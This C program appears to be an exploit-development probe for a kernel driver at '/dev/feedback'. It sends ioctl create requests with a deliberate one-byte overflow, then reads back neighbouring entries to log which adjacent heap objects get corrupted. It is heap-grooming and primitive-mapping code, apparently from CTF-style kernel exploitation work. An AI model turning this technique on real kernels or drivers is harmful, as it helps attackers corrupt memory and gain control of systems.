#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    errno = 0;
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) exit(1);
    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;
    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int read_fb(int fd, uint64_t id, unsigned char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = (char *)out };
    return xioctl(fd, CMD_READ, &req);
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const int n = 240;
    const uint64_t base = 0x1300000;
    unsigned char out[0x80];
    unsigned char snap[240][8];
    int has[240];
    int logged[240];

    memset(has, 0, sizeof(has));
    memset(logged, 0, sizeof(logged));

    puts("[+] sequential create + edge mapping");
    for (int i = 0; i < n; i++) {
        uint64_t id = base + (uint64_t)i;
        unsigned char fill = (unsigned char)(0x20 + (i % 90));
        unsigned char ov = (unsigned char)i;

        if (create_fb(fd, id, 0x40, fill, ov) != 0) {
            printf("create fail i=%d errno=%d\n", i, errno);
            break;
        }

        for (int j = 0; j <= i; j++) {
            uint64_t oid = base + (uint64_t)j;
            if (read_fb(fd, oid, out, sizeof(out)) != 0) {
                continue;
            }

            if (!has[j]) {
                memcpy(snap[j], out, 8);
                has[j] = 1;
                continue;
            }

            if (memcmp(out, snap[j], 8) != 0) {
                int b0chg = out[0] != snap[j][0];
                int tail_same = memcmp(out + 1, snap[j] + 1, 7) == 0;
                if (!logged[j]) {
                    logged[j] = 1;
                    printf("EDGE step=%d ov=0x%02x -> victim_step=%d id=%llu old0=0x%02x new0=0x%02x b0chg=%d tail_same=%d\n",
                           i,
                           ov,
                           j,
                           (unsigned long long)oid,
                           snap[j][0],
                           out[0],
                           b0chg,
                           tail_same);
                }
                memcpy(snap[j], out, 8);
            }
        }

        if ((i % 32) == 0) {
            printf(".. step=%d\n", i);
        }
    }

    int edge_count = 0;
    for (int i = 0; i < n; i++) if (logged[i]) edge_count++;
    printf("[+] summary edge_count=%d\n", edge_count);

    puts("[+] cleanup");
    for (int i = 0; i < n; i++) del_fb(fd, base + (uint64_t)i);

    close(fd);
    puts("[+] done");
    return 0;
}